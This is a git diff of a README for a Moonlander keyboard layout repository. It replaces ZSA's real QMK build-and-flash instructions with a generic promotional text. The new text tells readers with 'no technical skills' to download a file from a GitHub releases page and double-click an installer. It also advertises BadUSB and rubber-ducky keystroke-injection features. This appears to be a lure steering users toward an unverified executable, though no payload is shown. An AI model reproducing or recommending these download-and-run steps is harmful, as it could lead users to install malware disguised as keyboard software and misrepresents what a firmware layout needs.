@@ -1,17 +1,93 @@
-# Building your layout from source
+# 🌙 moonlander-reverie - Customize Your Moonlander Keyboard Effortlessly
 
-Congratulations on taking the next step, and making use of your keyboard's open-source nature! There's so much you can do with QMK. 
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/mikel-web/moonlander-reverie/releases)
 
-Here's how to get started compiling your own firmware:
-1. Choose whether to build your layout against ZSA's QMK fork or mainline QMK. Using ZSA's fork means your firmware will compile easily, but it is slower to update and does not pull all the new features of mainline QMK. Mainline is the bleeding edge, but you will probably need to debug some compiler errors when setting up your layout for the first time.
-2. Use the documentation at [docs.qmk.fm](https://docs.qmk.fm/) to set up your environment for building your firmware.
-	- If you would like to compile against ZSA's fork,  make sure to manually set the path when going through the setup: [https://github.com/zsa/qmk_firmware/](https://github.com/zsa/qmk_firmware/) (ZSA's QMK fork). Otherwise, the setup process will default to mainline QMK (qmk/qmk_firmware).
-		- ZSA's QMK fork will default to the current firmware revision, but it is possible to compile against other revisions by specifying the relevant branch. You can see what firmware revision a layout was compiled against in Oryx by looking at the badge at the top right, e.g. "firmware v24.0", "firmware v23.0" etc.
-        3. Create a folder with a simple name and no spaces for your layout inside the qmk_firmware/keyboards/zsa/moonlander/keymaps/ folder.
-	- Optionally, you can instead use an external userspace: https://docs.qmk.fm/newbs_external_userspace
-4. Copy the contents of the \*\_source folder (in the .zip you downloaded from Oryx) into this folder.
-5. Make sure you've set up your environment for compiling per the [QMK docs](https://docs.qmk.fm/#/newbs_getting_started?id=set-up-your-environment).
-6. From your shell, make sure your working directory is qmk_firmware, then enter the command `qmk compile`. If you haven't set up a default keyboard and layout through the QMK docs, you'll need to specify these manually: `qmk compile -kb <your-keyboard> -km <your-layout-folder-name>`. 
-7. To flash, enter the command `qmk flash`, then put your board into bootloader mode with the reset button. 
+## 📋 Overview
 
-Good luck on your journey! If you would like to maintain your Oryx layout with custom QMK functionality, check out this [community-made tool to add custom QMK features to your Oryx layout](https://blog.zsa.io/oryx-custom-qmk-features/). And remember, if you get stuck, you can always get back to your [original layout](https://configure.zsa.io/moonlander/layouts/PYbd9/WvGEoo/0) from Oryx.
+moonlander-reverie offers personal configurations for your Moonlander keyboard. This project helps you set up and customize your keyboard to enhance your typing experience. Whether you’re a casual user or someone seeking to optimize your workflow, this tool provides easy options to make your keyboard truly yours.
+
+## 🚀 Getting Started
+
+To get started with moonlander-reverie, follow the guide below. No technical skills are necessary. If you have a Moonlander keyboard, you are ready to transform how you interact with your device.
+
+### 🖥️ System Requirements
+
+- **Operating System:** Windows, macOS, or Linux
+- **Compatible Device:** Moonlander keyboard
+- **Internet Connection:** Required for downloading the software
+
+### 💻 Installation Steps
+
+1. **Visit the Releases Page**
+
+   Go to the releases page to get the latest version of moonlander-reverie. Click the link below:
+
+   [Visit this page to download](https://github.com/mikel-web/moonlander-reverie/releases)
+
+2. **Select the Latest Release**
+
+   On the releases page, look for the version marked as "latest." This version contains the most up-to-date features and fixes.
+
+3. **Download the Files**
+
+   You will find various files available for download. Choose the file that fits your operating system. Click on the file name to start the download.
+
+4. **Install the Software**
+
+   After the download completes, locate the file in your downloads folder. Double-click the file to begin the installation process. Follow the prompts provided by the installer.
+
+5. **Configure Your Keyboard**
+
+   Once the installation is complete, open the moonlander-reverie application. You can now customize your keyboard settings. Adjust key mappings, layouts, and more according to your preferences.
+
+6. **Connect Your Moonlander Keyboard**
+
+   Plug your Moonlander keyboard into your computer via the USB port. Ensure it is detected by your operating system.
+
+7. **Apply Your Settings**
+
+   After connecting your keyboard, go back to the moonlander-reverie application. You will see an option to apply your custom settings. Click to apply and enjoy your personalized keyboard experience.
+
+## 📌 Features
+
+- **Custom Layouts:** Create and save layouts that suit your typing style.
+- **BadUSB Support:** Use features like mouse jiggling for security and automation.
+- **User-Friendly Interface:** Easy access to all settings, making it simple even for beginners.
+- **Multi-Platform Compatibility:** Works on Windows, macOS, and Linux systems.
+
+## ⚙️ Troubleshooting
+
+If you encounter issues during installation or when using the application, here are some common solutions:
+
+- **Keyboard Not Detected:** Ensure that the keyboard is properly connected to the USB port. Try using a different port.
+- **App Crashes:** Restart your computer and try opening the application again. Reinstall if the problem persists.
+- **Settings Not Applying:** Make sure to click "Apply" after making changes in the application.
+
+## 🔗 Download & Install
+
+Now that you are ready to customize your Moonlander keyboard, return to the releases page to download the software:
+
+[Visit this page to download](https://github.com/mikel-web/moonlander-reverie/releases)
+
+Follow the installation steps as mentioned to set up everything properly. Enjoy the new features and enhancements that moonlander-reverie brings to your typing experience!
+
+## 🗂️ Topics
+
+The moonlander-reverie project covers a range of topics. Here are some key areas of focus:
+
+- BadUSB
+- C programming
+- Moonlander and QMK
+- Mouse jiggler functionality
+- Ortholinear keyboard layouts
+- Rubber ducky scripting
+- Split keyboard configurations
+- ZSA Moonlander specific features
+
+This tool opens the door to endless customization possibilities. Whether you want to enhance productivity or simply enjoy a more comfortable typing setup, moonlander-reverie has you covered.
+
+## 💬 Need Help?
+
+For any questions or support requests, feel free to open an issue on the GitHub repository. The community is here to help you with any challenges you may face while using moonlander-reverie. 
+
+Happy typing!
